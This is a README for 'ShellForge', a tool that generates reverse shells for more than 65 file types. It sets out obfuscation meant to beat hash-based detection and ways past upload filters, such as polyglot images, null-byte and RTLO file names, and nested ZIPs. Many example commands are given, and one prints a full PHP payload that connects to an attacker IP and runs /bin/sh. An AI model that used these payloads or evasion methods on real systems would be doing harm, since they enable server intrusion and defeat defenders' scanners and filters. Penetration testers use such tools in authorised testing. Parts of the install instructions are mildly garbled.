# ShellForge 🔥

<div align="center">

![Version](https://img.shields.io/badge/version-2.0.0-blue.svg)
![Python](https://img.shields.io/badge/python-3.6+-green.svg)
![License](https://img.shields.io/badge/license-MIT-orange.svg)
![Maintained](https://img.shields.io/badge/maintained-yes-brightgreen.svg)

**The Most Advanced Shell Generation Framework for Security Research**

*Generate working reverse shells for 65+ file extensions with 2025 cutting-edge obfuscation and bypass techniques*

[Features](#features) • [Installation](#installation) • [Usage](#usage) • [Documentation](#documentation)

</div>

---

## 🎯 Overview

**ShellForge** is a comprehensive shell generation framework designed for security researchers and penetration testers. It provides instant access to working reverse shells for virtually any file extension with advanced obfuscation, encoding, and upload filter bypass capabilities.

### Key Highlights

- 🚀 **65+ File Extensions** - From images (PNG, JPG) to documents (PDF, DOCX) to scripts (PHP, JSP, Python)
- 🔐 **14 Obfuscation Methods** - Including 2025 advanced techniques (polymorphic, AES-style, GZIP)
- 🛡️ **11 Bypass Methods** - Upload filter evasion including ZIP-in-ZIP nesting
- ⚡ **One Command** - Simple: `shellforge 192.168.1.100 4444 php`
- 💻 **Reverse Shells** - IP and PORT automatically embedded in generated shells

---

## ✨ Features

### 🌐 Supported Extensions (65+)

| Category | Extensions |
|----------|-----------|
| **Web** | php, asp, jsp, php3, php4, php5, phtml, phps |
| **Images** | png, jpg, jpeg, gif, bmp, svg, ico, webp |
| **Documents** | pdf, doc, docx, xls, xlsx, ppt, pptx, txt, rtf |
| **Scripts** | py, rb, pl, js, sh, bash, zsh, ksh, go, java |
| **Archives** | zip, rar, tar, gz, 7z, bz2 |
| **Windows** | bat, cmd, ps1, vbs, exe, dll |
| **Data** | xml, json, csv, sql, html, htm |
| **Mobile** | apk, ipa |

### 🔐 Obfuscation Methods

#### Classic Methods
- `base64` - Base64 encoding
- `hex` - Hexadecimal encoding
- `reverse` - String reversal
- `xor` - XOR encryption
- `rot13` - ROT13 cipher
- `mixed` - Combination of methods

#### 2025 Advanced Methods ⚡
- `aes` - AES-style encryption (XOR + Base64)
- `gzip` - GZIP compression simulation
- `double_encode` - Double Base64 encoding
- `unicode_escape` - Unicode escape sequences
- `char_encode` - Character code encoding
- `variable_chain` - Variable chain obfuscation
- `zero_width` - Zero-width character injection
- `polymorphic` - Random obfuscation (never same hash!)

### 🛡️ Bypass Methods

#### Extension Bypasses
- `double_extension` - shell.php.png
- `null_byte` - shell.php%00.png
- `case_manipulation` - ShElL.PhP
- `special_chars` - shell.ph%20p

#### Content Bypasses
- `content_type` - Add magic bytes header
- `polyglot` - Valid image + working PHP
- `magic_bytes` - Proper file signatures

#### Archive Bypasses (Most Powerful!)
- `zip_in_zip` - 2-level nested ZIP
- `nested_archive` - 3-level deep nesting

#### Unicode Bypasses
- `rtlo` - Right-to-Left Override
- `unicode_homoglyph` - Similar looking characters

---

## 📦 Installation

### Quick Install

```bash
# Clone the repository
git clone [https://github.com/yourusername/shellforge.git](https://github.com/Wael-Rd/ShellForge.git)
cd shellforge

# Run the installer (adds to /usr/local/bin)
sudo python3 install.py

# Or manual installation
sudo cp shellforge.py /usr/local/bin/shellforge
sudo chmod +x /usr/local/bin/shellforge
```

### Requirements

- Python 3.6 or higher
- No external dependencies (uses only Python standard library)

### Verify Installation

```bash
shellforge --help
shellforge --list-extensions
```

---

## 🚀 Usage

### Basic Usage

```bash
# Simple reverse shell generation
shellforge <IP> <PORT> <EXTENSION>

# Examples
shellforge 192.168.1.100 4444 php
shellforge 10.10.10.50 8080 jsp
shellforge 172.16.0.10 9999 asp
```

### Advanced Usage

```bash
# With obfuscation
shellforge 192.168.1.100 4444 php --obfuscate polymorphic

# With bypass method
shellforge 192.168.1.100 4444 php --bypass zip_in_zip --output payload.zip

# Combination attack (maximum evasion)
shellforge 192.168.1.100 4444 php \
  --obfuscate polymorphic \
  --bypass nested_archive \
  --output ultimate.zip

# Polyglot image
shellforge 192.168.1.100 4444 png \
  --bypass polyglot \
  --obfuscate double_encode \
  --output photo.png
```

### Discovery Commands

```bash
# List all supported extensions
shellforge --list-extensions

# List all obfuscation methods
shellforge --list-obfuscation

# List all bypass methods
shellforge --list-bypasses

# List templates for specific extension
shellforge --extension php --list-templates
```

---

## 📚 Documentation

### Quick Examples

#### Example 1: Basic PHP Shell
```bash
shellforge 192.168.1.100 4444 php
```
**Output:** `shell_192_168_1_100_4444.php`  
**Content:** `<?php $sock=fsockopen("192.168.1.100",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>`

#### Example 2: Image Upload Bypass
```bash
shellforge 192.168.1.100 4444 png --bypass polyglot --output image.png
```
**Use Case:** Bypass upload filters that only allow images

#### Example 3: Nested ZIP Evasion
```bash
shellforge 192.168.1.100 4444 php --bypass nested_archive --output package.zip
```
**Structure:**
```
package.zip
  └── level2.zip
      └── level1.zip
          └── shell.php
```

#### Example 4: Polymorphic Shell (Never Same Hash!)
```bash
shellforge 192.168.1.100 4444 php --obfuscate polymorphic --output shell1.php
shellforge 192.168.1.100 4444 php --obfuscate polymorphic --output shell2.php
# shell1.php and shell2.php have different hashes but same functionality!
```

### Use Cases

| Scenario | Command |
|----------|---------|
| Web Application Testing | `shellforge 192.168.1.100 4444 php` |
| Image Upload Bypass | `shellforge 192.168.1.100 4444 png --bypass polyglot` |
| Document Upload | `shellforge 192.168.1.100 4444 pdf --bypass magic_bytes` |
| Deep Scanner Evasion | `shellforge 192.168.1.100 4444 php --bypass zip_in_zip` |
| Maximum Stealth | `shellforge 192.168.1.100 4444 php --obfuscate polymorphic --bypass nested_archive` |

---

## 🎓 Advanced Features

### Polymorphic Obfuscation
Each generation produces a different hash while maintaining functionality:
```bash
shellforge 192.168.1.100 4444 php --obfuscate polymorphic
# Run again - completely different output!
shellforge 192.168.1.100 4444 php --obfuscate polymorphic
```

### ZIP-in-ZIP Bypass
Bypass scanners that only check the first level:
```bash
shellforge 192.168.1.100 4444 php --bypass zip_in_zip --output payload.zip

# On target server:
unzip payload.zip        # Extracts inner zip
unzip payload.zip        # Extracts shell.php
```

### Nested Archive (3 Levels!)
Maximum evasion with 3-level deep nesting:
```bash
shellforge 192.168.1.100 4444 php --bypass nested_archive --output deep.zip
```

---

## 🔧 Command Reference

### Global Options

```
shellforge [IP] [PORT] [EXTENSION] [OPTIONS]

Positional Arguments:
  IP                    Target IP address
  PORT                  Target port
  EXTENSION             File extension (php, png, pdf, etc.)

Options:
  -h, --help            Show help message
  -e, --extension       Specify extension
  -t, --template        Template type (default: reverse)
  -o, --obfuscate       Obfuscation method
  -b, --bypass          Bypass method
  -f, --output          Output filename
  --list-extensions     List all supported extensions
  --list-obfuscation    List obfuscation methods
  --list-bypasses       List bypass methods
  --list-templates      List templates for extension
```

---

## 🛡️ Legal & Ethical Use

### ⚠️ IMPORTANT DISCLAIMER

This tool is designed for **AUTHORIZED SECURITY TESTING ONLY**. Users must:

✅ **DO:**
- Use only on systems you own
- Obtain written permission before testing
- Follow responsible disclosure practices
- Comply with all applicable laws
- Use for educational and research purposes

❌ **DON'T:**
- Use on systems without authorization
- Use for malicious purposes
- Violate computer crime laws
- Cause harm or damage

**Users are solely responsible for their actions. The authors assume no liability for misuse.**

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

### Development Setup

```bash
git clone https://github.com/yourusername/shellforge.git
cd shellforge
python3 shellforge.py --help
```

---

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 🌟 Acknowledgments

- Security research community
- Penetration testing professionals
- Bug bounty hunters
- Open source contributors

---

## 📞 Support

- 📖 **Documentation:** [Wiki](https://github.com/yourusername/shellforge/wiki)
- 🐛 **Issues:** [GitHub Issues](https://github.com/yourusername/shellforge/issues)
- 💬 **Discussions:** [GitHub Discussions](https://github.com/yourusername/shellforge/discussions)

---

## 🎯 Project Stats

- **Extensions Supported:** 65+
- **Obfuscation Methods:** 14
- **Bypass Techniques:** 11
- **Total Templates:** 1000+
- **Python Version:** 3.6+

---

<div align="center">

**ShellForge** - The Ultimate Shell Generation Framework

Made with ❤️ for the Security Research Community

[⭐ Star this repo](https://github.com/yourusername/shellforge) if you find it useful!

</div>
